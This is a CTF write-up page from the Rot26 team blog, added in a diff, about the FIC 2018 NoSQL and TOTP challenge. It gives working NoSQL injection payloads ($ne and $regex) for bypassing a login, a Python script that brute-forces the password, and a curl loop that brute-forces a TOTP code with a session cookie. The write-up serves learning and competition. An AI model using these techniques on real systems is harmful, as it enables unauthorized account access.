@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      NoSQL and TOTP &middot; Rot26
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="page">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Rot26
+      </a>
+    </div>
+    <p class="lead"></p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  
+
+<h1>CTFs</h1>
+
+  
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/BreizhCTF.html">BreizhCTF</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/FIC_Escape.html">FIC_Escape</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/Hacklu.html">Hacklu</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/LabyREnth.html">LabyREnth</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/MetaSploitable3.html">MetaSploitable3</a>
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+
+  <h1>Members</h1>
+<a href="https://twitter.com/Memoi2001">Fooker</a>
+<a href="https://twitter.com/kalimer0x00">Kalimer0x00</a>
+<a href="https://twitter.com/govlog">Govlog</a>
+<a href="https://twitter.com/maxencedun">Sp4rKy</a>
+
+<br/>
+<a href="https://twitter.com/Rot26CTF">@Rot26CTF</a>
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+  
+</div>
+
+    <main class="container">
+      <div class="content">
+  <h1 id="nosql-and--totp">NoSQL and  TOTP</h1>
+
+<p>Sadly, because of some infrastructure downtime during CTF, I didn’t manage to finish the TOTP part.
+However, I solved the first part (NoSQL).</p>
+
+<h2 id="nosql">NoSQL</h2>
+
+<p>So, we had a webpage with some login form, playing with it shows that submitting a logging request was asking (https://nosql-totp.fic2k18.ctf/sender.php) to validate.</p>
+
+<p>The payload was like :</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"someuser"</span><span class="p">,</span><span class="w"> </span><span class="s2">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"somepassword"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We know there is some nosql vulnerability, so we first tried Mongo, with something like:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="s2">"foo"</span><span class="p">},</span><span class="w"> </span><span class="s2">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s2">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bar"</span><span class="w"> </span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>and we got <code class="highlighter-rouge">OK</code> \o/. So we have some oracle to guess the username and password.</p>
+
+<p><code class="highlighter-rouge">$regex</code> to the rescue, we can find each char one by one. Following code is to BF password, same was used for username:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib3</span>
+<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+
+<span class="n">u</span><span class="o">=</span><span class="s">"https://nosql-totp.fic2k18.ctf/sender.php"</span>
+
+<span class="n">user</span><span class="o">=</span><span class="s">"Barry Allen"</span>
+<span class="n">password</span><span class="o">=</span><span class="s">""</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'*'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'?'</span><span class="p">,</span><span class="s">'|'</span><span class="p">]:</span>
+            <span class="n">payload</span><span class="o">=</span><span class="s">'{"username": {"$eq": "</span><span class="si">%</span><span class="s">s"}, "password": {"$regex": "^</span><span class="si">%</span><span class="s">s" }}'</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'ids'</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">'OK'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"Found one more char : </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="p">))</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+</code></pre></div></div>
+
+<p>After a few minutes, we got :</p>
+
+<ul>
+  <li>Username : Barry Allen</li>
+  <li>Password : H5dfssdfG2DDDF665SDdf2s</li>
+</ul>
+
+<h2 id="totp">TOTP</h2>
+
+<p>We then logged in, and saw the site was asking for a TOTP (One time password). We didn’t get the private key or whatever, however looking in TOTP/ directory (thanks to the url) we found that https://github.com/Voronenko/PHPOTP has been used.</p>
+
+<p>So likely the OTP is a six digits number, valid for 30 seconds. And once again we had an oracle sending ‘0’ if the TOTP was invalid (and so we guess ‘1’ if it is valid).
+You can try as many OTP as you want, given they change every 30s. There are ~ 999999 possibilities so you may still get the good value after some reasonable time.</p>
+
+<p>Based on this, we should be able to:</p>
+
+<ul>
+  <li>Login</li>
+  <li>Get PHPSESSID</li>
+  <li>Bruteforce the TOTP until I get ‘1’</li>
+  <li>Go to admin page.</li>
+</ul>
+
+<p>I bruteforced it with some stupid curl (starting at 100000 because I was too lazy to format it correctly):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ret</span><span class="o">=</span>0<span class="p">;</span> <span class="nv">i</span><span class="o">=</span>100000<span class="p">;</span> <span class="k">while</span> <span class="o">[</span> <span class="nv">$ret</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span><span class="k">do </span><span class="nv">ret</span><span class="o">=</span><span class="k">$(</span>curl <span class="nt">-s</span> http://10.15.10.106:8001/TOTP/checkTotpCode.php <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=XXXXXXXXXX'</span> <span class="nt">--data</span> <span class="s2">"totp_code=</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">"</span><span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$ret</span><span class="s2"> : </span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span> <span class="nv">i</span><span class="o">=</span><span class="k">$((</span>i+1<span class="k">))</span> <span class="p">;</span><span class="k">done</span>
+</code></pre></div></div>
+
+<p>After the infrastructure came back, I started to bruteforce a bit, and at some point got this <code class="highlighter-rouge">1</code> I was waiting for.</p>
+
+<p>Sadly, I was working on some other challenge and see it returned way too late :(</p>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
